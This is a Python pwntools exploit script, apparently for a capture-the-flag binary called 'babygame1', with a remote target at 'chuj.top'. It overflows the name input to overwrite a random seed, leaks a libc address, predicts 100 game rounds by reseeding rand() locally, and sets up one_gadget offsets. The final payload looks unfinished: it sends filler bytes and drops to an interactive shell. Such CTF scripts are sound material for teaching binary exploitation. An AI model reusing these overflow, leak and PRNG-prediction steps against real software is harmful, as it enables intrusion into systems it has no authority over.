#! /usr/bin/env python3
from pwn import *
from ctypes import *

arch = 64
challenge = './babygame1'

context.os='linux'
context.log_level = 'debug'
if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc-2.31.so')

local = 1
if local:
    p = process(challenge)
else:
    p = remote('chuj.top', '53178')


def debug():
    gdb.attach(p)
    pause()

bps = [0x14B1]
pie = 1
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)

puts_plt = elf.plt['puts']


p.recvuntil('Please input your name:\n')
p.send(b'a'*256+p64(0x5555555555555555)+b'a'*0x20)

libc.address = u64(p.recvuntil('\x7f', timeout=1)[-6:].ljust(8, b'\x00'))-libc.sym['__libc_start_main'] - 237 - 6
log.success("libc.address: "+hex(libc.address))


c = cdll.LoadLibrary("libc-2.31.so")
c.srand(0x5555555555555555)
for i in range(100):
    p.recvuntil('round '+ str(i+1)+ ': \n')
    a = c.rand() % 3
    p.sendline(str((a+1)%3))


p.recvuntil('Good luck to you.')

one_array = [0xe3b2e,0xe3b31,0xe3b34]
one_gadgets = one_array[0] + libc.address
debug()
p.send('aaaaaaaa')

p.interactive()
